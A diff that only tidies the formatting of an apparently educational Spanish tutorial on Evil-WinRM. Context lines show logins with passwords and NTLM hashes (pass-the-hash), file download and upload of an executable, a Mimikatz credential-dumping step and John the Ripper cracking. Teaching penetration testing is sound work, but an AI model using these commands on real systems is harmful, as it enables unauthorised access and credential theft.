@@ -30,7 +30,6 @@ evil-winrm -i 192.168.1.10 -u Administrator -p password123
 - `-u`: Nombre de usuario.
 - `-p`: Contraseña.
 
-
 ### 🔐 Con hash NTLM
 
 ```bash
@@ -51,7 +50,6 @@ evil-winrm -i 192.168.1.10 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:
 
 ---
 
-
 ## 🧪 Ejemplo práctico
 
 ```bash
@@ -70,13 +68,13 @@ PS C:\Users\Administrator\Desktop> Get-ChildItem
 
 ## 📥 Transferencia de archivos
 
-### Descargar un archivo del servidor:
+### Descargar un archivo del servidor
 
 ```powershell
 download C:\Users\Administrator\Desktop\secreto.txt
 ```
 
-### Subir un archivo desde tu máquina:
+### Subir un archivo desde tu máquina
 
 ```powershell
 upload /home/kali/archivo.exe C:\Users\Administrator\Desktop\
@@ -88,7 +86,7 @@ upload /home/kali/archivo.exe C:\Users\Administrator\Desktop\
 
 Si tienes acceso al sistema, puedes usar **Mimikatz** para extraer hashes de memoria.
 
-### Pasos básicos:
+### Pasos básicos
 
 1. Subir Mimikatz:
 
@@ -161,4 +159,3 @@ john --wordlist=/ruta/a/diccionario.txt hash.txt
 ¡Comparte este contenido y aprendamos juntos! 👨‍💻👩‍💻 #Ciberseguridad #PenTest #EvilWinRM #HashesNTLM #Redes #Cybersecurity #Windows #EthicalHacking
 
 ![Evil-WinRM](https://www.kali.org/tools/evil-winrm/images/evil-winrm-logo.svg)
-
